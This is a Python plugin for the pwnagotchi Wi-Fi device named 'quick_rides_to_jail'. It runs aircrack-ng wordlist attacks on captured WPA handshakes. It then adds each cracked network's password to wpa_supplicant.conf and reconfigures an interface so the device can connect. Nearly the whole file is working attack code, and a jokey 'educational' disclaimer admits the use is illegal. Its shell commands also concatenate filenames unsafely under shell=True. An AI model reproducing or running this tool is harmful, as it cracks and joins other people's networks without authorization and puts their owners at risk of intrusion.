__author__ = 'forrest'
__version__ = '1.0.1'
__name__ = 'quick_rides_to_jail'
__license__ = 'GPL3'
__description__ = 'Run a quick dictionary scan against captured handshakes, update wpa_supplicant for the supplied interface, and go straight to jail.'

'''
Aircrack-ng needed, to install:
> apt-get install aircrack-ng
Upload wordlist files in .txt format to folder in config file (Default: /opt/wordlists/)
Cracked handshakes stored in handshake folder as [essid].pcap.cracked 

Original use-case: 
    Emergency communications out to the internet, via distributed out-of-band network of
    pwnagotchi's. My research is in support of developing a PoC prototype mesh network capable
    of using the pwnagotchi's network to courier data over its out-of-band wireless channel
    and bridge gaps with pwnd wireless networks. Meh. One pwnagotchi encounters another in the
    desert, briefly. The one stranded in the desert holds out an encrypted message for family.
    A dieing wish. The traveling pwnagotchi picks up the message, says "I got you bro", and
    takes the message out to civilization, to pass on. The traveling pwnagotchi searches high
    and low for the desert bro's fam, but can't find them. Just then, the traveler connects
    to a wayward watering hole (i.e. a pwnd access point), and can send out a message, on blast 
    to desert bro's fam. Could low-key be a legit means of connectivity in a post-appocalypse
    type situation, but is high-key probably illegal for you to do on anyone else's network.
    Have fun in jail.

For educational and testing purposes, only. If you do not think that you have violated the law,
you most certainly are about to. By using and enabling the full functionality of this script,
you here by agree to sit quietly in the back of the police car.
'''

import logging
import json
import os
import subprocess
import string
import re
from collections import namedtuple
from pwnagotchi.utils import StatusFile

READY = False
OPTIONS = dict()
REPORT = StatusFile('/root/.aircracked_pcaps', data_format='json')
TEXT_TO_SET = ''

PwndNetwork = namedtuple('PwndNetwork', 'ssid bssid password')
handshake_file_re = re.compile('^(?P<ssid>.+?)_(?P<bssid>[a-f0-9]{12})\.pcap\.cracked$')
crackable_handshake_re = re.compile('\s+\d+\s+(?P<bssid>([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2})\s+(?P<ssid>.+?)\s+((\([1-9][0-9]* handshake(, with PMKID)?\))|(\(\d+ handshake, with PMKID\)))')


def on_loaded():
    global READY
    logging.info('[thePolice] Quick rides to prison and dictionary check plugin loaded.')
    READY = True


def on_ready(agent):
    global REPORT

    if not READY:
        return

    try:
        config = agent.config()
        reported = REPORT.data_field_or('reported', default=list())
        all_pcap_files = [os.path.join(config['bettercap']['handshakes'], filename) for filename in os.listdir(config['bettercap']['handshakes']) if filename.endswith('.pcap')]
        new_pcap_files = set(all_pcap_files) - set(reported)

        if not new_pcap_files:
            return

        for pcap_file in new_pcap_files:
            logging.info('[thePolice] Running uncracked pcap through aircrack: %s'%(pcap_file))
            try:
                _do_crack(agent, pcap_file)
                reported.append(pcap_file)
                REPORT.update(data={'reported': reported})
            except:
                continue

    except Exception as e:
        logging.error('[thePolice] Encountered exception in on_ready: %s'%(e))


def on_handshake(agent, filename, access_point, client_station):
    global REPORT 
    try:
        reported = REPORT.data_field_or('reported', default=list())
        if filename not in reported:
            _do_crack(agent, filename)
            reported.append(filename)
            REPORT.update(data={'reported': reported})
    except Exception as e:
        logging.error('[thePolice] Encountered exception in on_handshake: %s'%(e))


def set_text(text):
    global TEXT_TO_SET
    TEXT_TO_SET = text


def on_ui_update(ui):
    global TEXT_TO_SET
    if TEXT_TO_SET:
        ui.set('face', '(XωX)')
        ui.set('status', TEXT_TO_SET)
        TEXT_TO_SET = ''


def _do_crack(agent, filename):
    config = agent.config()    
    display = agent._view

    try:
        if config['main']['plugins']['quickdic']['enabled'] == 'true':
            logging.warning('[thePolice] Plugin quickdic is enabled. Cannot run with quickdic enabled...')
            return
    except Exception as e:
        logging.warning('[thePolice] Exception while checking for quickdic plugin in config file: %s', e)

    try:
        aircrack_execution = subprocess.run('/usr/bin/aircrack-ng %s'%(filename), shell=True, stdout=subprocess.PIPE)
        result = aircrack_execution.stdout.decode('utf-8').strip()
    except Exception as e:
        logging.warning('[thePolice] Exception while running initial aircrack-ng check: %s', e)
        return

    crackable_handshake = crackable_handshake_re.search(result)
    if not crackable_handshake:
        #logging.info('[thePolice] No handshakes found. Aircrack-ng output: %s', result)
        return
  
    logging.info('[thePolice] Confirmed handshakes captured for BSSID: %s', crackable_handshake.group('bssid'))

    try:        
        aircrack_execution_2 = subprocess.run(('aircrack-ng -w `echo '+os.path.join(OPTIONS['wordlist_folder'],'*.txt')+' | sed \'s/\ /,/g\'` -l '+filename+'.cracked -q '+filename+' -b '+crackable_handshake.group('bssid')+' -p 1 | grep KEY'),shell=True,stdout=subprocess.PIPE)
        crack_result = aircrack_execution_2.stdout.decode('utf-8').strip()
    except Exception as e:
        logging.error('[thePolice] Exception while running aircrack-ng for %s: %s'%(crackable_handshake.group('bssid'),e))
        return

    #logging.info('[thePolice] Aircrack output: '+crack_result)
    if crack_result != 'KEY NOT FOUND':
        key = re.search('\[(.*)\]', crack_result)
        _do_the_illegal_thing(config['bettercap']['handshakes'])
        set_text('Cracked password: '+str(key.group(1)))
        display.update(force=True)


def _reconfigure_wpa_supplicant():
    try:
        command = 'wpa_cli -i {} reconfigure'.format(OPTIONS['interface'])
        result = subprocess.check_output(command, shell=True)
	
        if result.strip() == 'OK':
            logging.info('[thePolice] Successfully updated wpa_supplicant for {}.'.format(OPTIONS['interface']))
            return
        logging.info('[thePolice] Failed to update wpa_supplicant for {}.'.format(OPTIONS['interface']))

    except Exception as e:
        logging.error('[thePolice] Exception while reconfiguring wpa_supplicant: %s', e)
    

def _get_pwnd_networks(handshakes_path):
    pwnd_networks = []
    file_matches = [handshake_file_re.search(file_name) for file_name in os.listdir(handshakes_path) if handshake_file_re.search(file_name) != None]
    
    for file_match in file_matches:
        try:
            with open(os.path.join(handshakes_path, file_match.string),'r') as f:
                #print('{} {} {}'.format(file_match.group('ssid'), re.sub(r'(.{2})(?!$)', r'\1:', file_match.group('bssid')), f.read()))
                pwnd_networks.append(PwndNetwork(file_match.group('ssid'), re.sub(r'(.{2})(?!$)', r'\1:', file_match.group('bssid')), f.read()))
        except Exception as e:
            logging.error('[thePolice] Exception while processing handshake file: %s', e)
            continue
    
    return pwnd_networks


def _add_pwnd_networks_to_wpa_supplicant(handshakes_path):
    wpa_supplicant_text = ''
    updated_count = 0
    try:
        with open(OPTIONS['wpa_supplicant_conf_path'], 'r') as f:
            wpa_supplicant_text = f.read()
    except Exception as e:
        logging.error('[thePolice] Exception while opening and reading wpa_supplicant config file: %s', e)
        return

    for pwnd_network in _get_pwnd_networks(handshakes_path):
        new_wpa_supplicant_string = ("network={{\n\tbssid={}\n\tpsk=\"{}\"\n\tkey_mgmt=WPA-PSK\n\tdisabled=1\n}}\n".format(pwnd_network.bssid, pwnd_network.password))
        
        if new_wpa_supplicant_string in wpa_supplicant_text:
            continue
        
        try:
            with open(OPTIONS['wpa_supplicant_conf_path'], 'a') as f:
                #print(new_wpa_supplicant_string)
                f.write(new_wpa_supplicant_string+'\n')
                updated_count += 1
        except Exception as e:
            logging.error('[thePolice] Exception while opening and writing to wpa_supplicant config file: %s', e)
            continue

    if updated_count > 0:
        logging.info('[thePolice] Congratulations! You added {} new access points to your wpa_supplicant.conf.'.format(updated_count))
        logging.info('[thePolice] You\'re goin to jail!')
        _reconfigure_wpa_supplicant()


def _get_network_interfaces():
    return os.listdir(OPTIONS['net_device_path'])


def _device_in_monitor_mode(device_name):
    device_type = ''
    try:
        with open(os.path.join(OPTIONS['net_device_path'], device_name, 'type')) as f:
            device_type = f.read().strip()
    except Exception as e:
        device_type = ''
        logging.error('[thePolice] Exception while opening and reading network device: %s', e)

    if device_type == '803':
        return True
    return False


def _do_the_illegal_thing(handshakes_path):
    if OPTIONS['interface'] not in _get_network_interfaces():
        logging.info('[thePolice] Could not find desired interface in list of local interfaces.')
        return
    logging.info('[thePolice] Found desired interface in list of local interfaces.')
    
    if _device_in_monitor_mode(OPTIONS['interface']):
        logging.info('[thePolice] Desired interface is in monitor mode - cannot use.')
        return
    logging.info('[thePolice] Desired interface is not in monitor mode.')
    
    _add_pwnd_networks_to_wpa_supplicant(handshakes_path)
